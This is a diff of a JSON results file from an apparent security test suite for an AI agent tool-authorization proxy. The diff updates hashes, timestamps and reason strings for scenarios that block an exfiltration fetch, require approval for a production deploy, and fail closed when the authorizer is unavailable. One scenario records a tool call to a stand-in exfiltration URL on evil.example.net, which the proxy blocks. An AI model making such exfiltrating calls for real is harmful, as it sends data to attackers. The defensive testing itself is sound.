@@ -1,5 +1,5 @@
 {
-  "commit_sha": "5d42b12bded275dc3cee608ae9bd232dc8b75da0",
+  "commit_sha": "unknown",
   "corpus": "examples/external-auth/scenarios",
   "envelope_note": "ASC envelopes are recorded for BLOCK/REQUIRE_APPROVAL rows decided by ASC or the adapter.",
   "evidence_generator": "the external-auth integration runner",
@@ -157,13 +157,13 @@
           "argument": "url",
           "value": "https://evil.example.net/exfil?d=1"
         },
-        "envelope_sha256": "sha256:cda51bcf88d7d9b22abce61008f73ba50d0e93c6dad172a865f1afb413bb652b",
+        "envelope_sha256": "sha256:91c6ccb6d994246489555fd566f3ec6dfec1f79fc7ab9484499c602086bf41a7",
         "policy_sha256": "sha256:55aa4940ada17f1c8924a950aaf35e63ce8d59d8a3f35f6f961220b4bf9ce06a",
         "policy_version": "1",
         "reason": "host not allowlisted for http.fetch.url",
         "scenario_id": "proxy_block_exfil",
         "schema_version": "1.0.0",
-        "timestamp": "2026-10-22T08:34:48Z",
+        "timestamp": "2026-10-22T08:40:03Z",
         "trace_id": "t-exfil",
         "verdict": "BLOCK"
       },
@@ -193,13 +193,13 @@
         "details": {
           "tool": "deploy.production"
         },
-        "envelope_sha256": "sha256:dfce2dccbd2a3e2909ba2d0e5b9abdc687e9c56d11a7ba6b0794c3b45e4db617",
+        "envelope_sha256": "sha256:7ac19dda2811aabba26adf9ef12696a589f3909e3171c204dd2dee9aca9ce730",
         "policy_sha256": "sha256:55aa4940ada17f1c8924a950aaf35e63ce8d59d8a3f35f6f961220b4bf9ce06a",
         "policy_version": "1",
         "reason": "high-impact tool requires approval: deploy.production",
         "scenario_id": "proxy_require_approval_deploy",
         "schema_version": "1.0.0",
-        "timestamp": "2026-10-22T08:34:48Z",
+        "timestamp": "2026-10-22T08:40:03Z",
         "trace_id": "t-unapproved-deploy",
         "verdict": "REQUIRE_APPROVAL"
       },
@@ -278,7 +278,7 @@
       "http_status": 403,
       "match": true,
       "owasp_risk": "ASI02 Tool Misuse & Exploitation / Authorizer Timeout",
-      "reason": "envoy ext_authz failure path (timeout); HTTP 403 (no ASC envelope)",
+      "reason": "envoy ext_authz failure path; HTTP 403 (no ASC envelope)",
       "scenario_id": "proxy_fail_closed_timeout",
       "severity": "high",
       "source": "proxy_fail_closed_timeout.json",
@@ -298,12 +298,12 @@
       "http_status": 403,
       "match": true,
       "owasp_risk": "ASI02 Tool Misuse & Exploitation / Authorizer Unavailable",
-      "reason": "envoy ext_authz failure path (down); HTTP 403 (no ASC envelope)",
+      "reason": "envoy ext_authz failure path; HTTP 403 (no ASC envelope)",
       "scenario_id": "proxy_fail_closed_authorizer_down",
       "severity": "high",
       "source": "proxy_fail_closed_authorizer_down.json",
       "title": "Proxy fail-closed when authorizer is down"
     }
   ],
-  "suite_time_ms": 17327
+  "suite_time_ms": 20299
 }
